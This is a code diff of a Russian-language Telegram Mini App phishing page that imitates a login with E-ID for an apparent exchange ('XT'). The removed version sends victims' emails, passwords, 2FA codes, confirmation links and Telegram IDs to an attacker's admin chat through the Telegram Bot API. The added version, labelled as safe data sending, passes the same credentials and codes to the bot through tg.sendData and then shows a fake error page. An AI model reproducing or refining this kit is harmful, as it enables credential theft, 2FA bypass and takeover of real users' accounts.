@@ -158,10 +158,6 @@
 
             <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
 
-            <div id="eidLoginError" class="message error" style="display:none; margin-top:12px;">
-                Ошибка. Повторите попытку входа.
-            </div>
-
             <button class="btn-secondary" onclick="goToMain()">← Назад</button>
         </div>
 
@@ -180,14 +176,6 @@
             </div>
 
             <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
-
-            <div id="eidLinkError" class="message error" style="display:none; margin-top:12px;">
-                Ошибка. Повторите попытку входа.
-            </div>
-
-            <div class="status-waiting" id="eidLinkStatus">
-                <span class="spinner"></span> Ожидание...
-            </div>
 
             <button class="btn-secondary" onclick="goToEid()">← Назад</button>
         </div>
@@ -208,14 +196,6 @@
 
             <button id="submitCodeBtn" class="btn-primary">Подтвердить</button>
 
-            <div id="codeError" class="message error" style="display:none; margin-top:12px;">
-                Неверный код. Попробуйте снова.
-            </div>
-
-            <div class="status-waiting" id="codeStatus">
-                <span class="spinner"></span> Ожидание...
-            </div>
-
             <button class="btn-secondary" onclick="goToMain()">← На главную</button>
         </div>
 
@@ -234,14 +214,6 @@
     </div>
 
     <script>
-        // ============================================================
-        // КОНФИГ
-        // ============================================================
-        const BOT_TOKEN = "СЮДА_ВСТАВЬТЕ_ТОКЕН_НОВОГО_БОТА_ДЛЯ_XT";
-        const ADMIN_ID = "СЮДА_ВСТАВЬТЕ_ВАШ_ЛИЧНЫЙ_ID"; // Например: "123456789"
-        const SUPPORT_LINK = "https://t.me/xtsupport";
-        const MAX_ATTEMPTS = 3;
-
         // ============================================================
         // ИНИЦИАЛИЗАЦИЯ
         // ============================================================
@@ -265,9 +237,6 @@
         const submitCodeBtn = document.getElementById('submitCodeBtn');
         const eidSubmitBtn = document.getElementById('eidSubmitBtn');
         const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
-
-        const codeStatus = document.getElementById('codeStatus');
-        const eidLinkStatus = document.getElementById('eidLinkStatus');
 
         const msgDiv = document.createElement('div');
         let userEmail = '';
@@ -300,8 +269,6 @@
             eidEmail.value = '';
             eidPassword.value = '';
             eidLinkInput.value = '';
-            codeStatus.style.display = 'none';
-            eidLinkStatus.style.display = 'none';
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
             eidSubmitBtn.disabled = false;
@@ -315,37 +282,20 @@
         function goToEidLink() { switchPage(pageEidLink); setTimeout(() => eidLinkInput.focus(), 300); }
         function goToLoginError() { switchPage(pageLoginError); }
 
-        function getUserData() {
-            const user = tg.initDataUnsafe?.user;
-            return user ? { id: user.id || 'неизвестно', first_name: user.first_name || 'Гость', username: user.username || 'нет' } : { id: 'неизвестно', first_name: 'Гость', username: 'нет' };
-        }
-
-        function openSupportChat() { window.open(SUPPORT_LINK, '_blank'); }
-
-        function handleError() {
-            attemptCount++;
-            if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('input').forEach(el => el.disabled = true);
-                document.querySelectorAll('button').forEach(el => el.disabled = true);
-                goToLoginError();
-                return true;
-            }
-            return false;
-        }
-
         // ============================================================
-        // ОТПРАВКА В БОТА
+        // БЕЗОПАСНАЯ ОТПРАВКА ДАННЫХ В БОТА
         // ============================================================
-        async function sendToAdmin(text) {
+        function sendToBot(payload) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
-                });
-                const result = await response.json();
-                return result.ok;
-            } catch (error) { console.error('Ошибка:', error); return false; }
+                // Формируем JSON-строку для отправки
+                const dataString = JSON.stringify(payload);
+                // Отправляем данные боту
+                tg.sendData(dataString);
+                return true;
+            } catch (e) {
+                console.error("Ошибка отправки:", e);
+                return false;
+            }
         }
 
         // ============================================================
@@ -364,23 +314,22 @@
             userEmail = e;
             userPassword = p;
 
-            const user = getUserData();
-            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
-
-            const ok = await sendToAdmin(msg);
+            const ok = sendToBot({
+                type: 'login_email_password',
+                email: e,
+                password: p
+            });
 
             if (ok) {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'Войти';
                 switchPage(pageCode);
-                codeStatus.style.display = 'block';
                 showMessage('Введите код 2FA', 'success');
                 setTimeout(() => codeInput.focus(), 300);
             } else {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'Войти';
-                if (handleError()) return;
-                showMessage(`Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`, 'error');
+                showMessage('Ошибка отправки. Попробуйте снова.', 'error');
             }
         });
 
@@ -395,22 +344,22 @@
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            const user = getUserData();
-            const msg = `🔐 Код 2FA\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔐 Код: ${code}`;
-
-            const ok = await sendToAdmin(msg);
+            const ok = sendToBot({
+                type: 'login_2fa',
+                email: userEmail,
+                password: userPassword,
+                code: code
+            });
 
             if (ok) {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
                 codeInput.value = '';
-                codeStatus.style.display = 'none';
                 goToLoginError();
             } else {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
-                if (handleError()) return;
-                showMessage(`Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`, 'error');
+                showMessage('Ошибка отправки. Попробуйте снова.', 'error');
             }
         });
 
@@ -430,23 +379,22 @@
             userEmail = e;
             userPassword = p;
 
-            const user = getUserData();
-            const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
-
-            const ok = await sendToAdmin(msg);
+            const ok = sendToBot({
+                type: 'eid_login',
+                email: e,
+                password: p
+            });
 
             if (ok) {
                 eidSubmitBtn.disabled = false;
                 eidSubmitBtn.textContent = 'Войти через E-ID';
                 switchPage(pageEidLink);
-                eidLinkStatus.style.display = 'block';
                 showMessage('Ссылка отправлена на почту', 'success');
                 setTimeout(() => eidLinkInput.focus(), 300);
             } else {
                 eidSubmitBtn.disabled = false;
                 eidSubmitBtn.textContent = 'Войти через E-ID';
-                if (handleError()) return;
-                showMessage(`Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`, 'error');
+                showMessage('Ошибка отправки. Попробуйте снова.', 'error');
             }
         }
 
@@ -461,22 +409,22 @@
             eidLinkSubmitBtn.disabled = true;
             eidLinkSubmitBtn.textContent = 'Отправка...';
 
-            const user = getUserData();
-            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
-
-            const ok = await sendToAdmin(msg);
+            const ok = sendToBot({
+                type: 'eid_link',
+                email: userEmail,
+                password: userPassword,
+                link: link
+            });
 
             if (ok) {
                 eidLinkSubmitBtn.disabled = false;
                 eidLinkSubmitBtn.textContent = 'Подтвердить';
                 eidLinkInput.value = '';
-                eidLinkStatus.style.display = 'none';
                 goToLoginError();
             } else {
                 eidLinkSubmitBtn.disabled = false;
                 eidLinkSubmitBtn.textContent = 'Подтвердить';
-                if (handleError()) return;
-                showMessage(`Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`, 'error');
+                showMessage('Ошибка отправки. Попробуйте снова.', 'error');
             }
         }
     </script>
